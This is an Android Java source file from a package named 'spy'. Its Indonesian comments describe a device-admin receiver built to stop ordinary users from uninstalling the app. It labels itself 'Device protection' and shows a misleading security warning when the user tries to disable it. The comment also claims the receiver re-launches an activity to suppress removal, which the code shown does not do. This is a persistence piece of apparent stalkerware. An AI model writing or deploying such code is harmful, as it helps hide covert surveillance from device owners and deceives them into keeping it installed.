package com.zaxz.spy;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

/**
 * DeviceAdminReceiver dengan anti-uninstall.
 *
 * Cara kerjanya:
 *  - Saat user coba uninstall APK lewat Settings, Android cek dulu apakah
 *    APK ini aktif sebagai Device Admin. Kalau iya, uninstall DITOLAK.
 *  - User harus masuk ke Settings > Security > Device admin apps, dan
 *    nonaktifkan admin manual sebelum bisa uninstall.
 *  - Saat user coba nonaktifkan admin, onDisableRequested() dipanggil —
 *    kita return CharSequence yang ditampilkan sebagai warning, dan
 *    di sini kita juga langsung re-launch activity untuk nge-mute UX-nya.
 *
 * Catatan: anti-uninstall ini bukan 100% bullet-proof (user teknis tetap
 * bisa bypass pakai ADB), tapi cukup efektif buat user awam.
 */
public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Toast.makeText(context, "Device protection enabled", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Toast.makeText(context, "Device protection disabled", Toast.LENGTH_LONG).show();
    }

    /**
     * Dipanggil SISTEM saat user akan menonaktifkan admin.
     * Return text ini akan ditampilkan sebagai peringatan konfirmasi.
     */
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Warning: disabling device protection may cause security issues. "
                + "Are you sure you want to continue?";
    }
}
